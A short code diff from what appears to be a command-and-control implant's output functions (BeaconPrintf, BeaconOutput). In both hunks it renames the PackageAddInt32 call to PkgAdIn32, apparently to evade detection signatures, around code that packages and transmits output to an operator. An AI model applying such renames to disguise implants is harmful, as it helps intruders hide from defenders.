@@ -294,7 +294,7 @@ VOID BeaconPrintf( INT Type, PCHAR fmt, ... )
 
     PRINTF( "CallbackOutput[%d]: \n%s\n", CallbackSize, CallbackOutput );
 
-    PackageAddInt32( package, Type );
+    PkgAdIn32( package, Type );
     PackageAddBytes( package, CallbackOutput, CallbackSize );
     PackageTransmit( package );
 
@@ -316,7 +316,7 @@ VOID BeaconOutput( INT Type, PCHAR data, INT len )
         Package = PackageCreate( BEACON_OUTPUT );
     }
 
-    PackageAddInt32( Package, Type );
+    PkgAdIn32( Package, Type );
     PackageAddBytes( Package, ( PBYTE ) data, len );
     PackageTransmit( Package );
 }
